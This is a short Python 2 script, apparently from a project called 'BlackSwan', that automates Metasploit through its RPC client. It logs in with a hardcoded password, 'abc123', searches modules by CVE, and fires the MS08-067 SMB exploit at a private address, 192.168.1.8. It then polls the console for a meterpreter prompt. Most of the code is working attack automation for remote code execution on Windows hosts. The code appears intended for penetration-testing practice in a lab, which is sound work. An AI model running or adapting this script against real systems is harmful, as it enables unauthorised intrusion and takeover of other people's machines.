#!/usr/bin/env python


import metasploit.msfrpc as mrc
import time

class BsMsf:	#Metaspoit Interface
	
	def __init__(self):
		self.consol = self.crCons()
		
	def conmsf(self):			#Connect MSF
		#cmd = shlex.split("msfconsole -r /root/Desktop/BlackSwan Project/BS Test/msf.rc")
		#subprocess.Popen(cmd,stdout=subprocess.STDOUT,stderr=subprocess.STDOUT)
		argc = {"port":55552,"ssl":False}
		conn= mrc.MsfRpcClient("abc123", **argc)
		print conn	
		return conn
	
	def crCons(self):		#Create console
		conn= self.conmsf()
		cons = mrc.MsfConsole(conn, cid=None)
		#cons.cid.decode()
		#rcons(cons)
		return cons
				
	def exploitT(self, exploit, RHOST): # exploit testing
		cons = self.consol
		cmd ="use "+ exploit+ "\nset RHOST "+ RHOST+"\nexploit"
		print cmd 
		cons.write(cmd)
		#self.rcons()
		
	def searchmsf(self, cve ="", typee ="", platform= ""):
			cmd		="search cve: "+cve
			#+" type:"+typee+" platform:"+platform
			self.consol.write(cmd)
	
	def testExp(self):		#Reed output from console
		
		cons = self.consol
		while True:
			res = cons.read()
			if len(res["data"]) > 1:
					print res["data"]
					'''if res["data"].find("meterpreter>"):
						#cons.write("reboot")
						print "You Are Good"
						'''
			if res['busy']:
					time.sleep(1)
					continue
	
			break
		
	def rcons(self):		#Reed output from console
		
		cons = self.consol
		while True:
			res = cons.read()
			if len(res["data"]) > 1:
					print res["data"]
					if res["data"].find("meterpreter>"):
						#cons.write("reboot")
						print "You Are Good"
						
			if res["busy"] == True:
					time.sleep(3)
					continue
			#break
	
def main():
		exploit ="exploit/windows/smb/ms08_067_netapi"
		RHOST ="192.168.1.8" 
		bs = BsMsf()
		#bs.searchmsf("1999-0524")
		bs.exploitT(exploit, RHOST)
		bs.rcons()
	
if __name__ =="__main__":
	main()
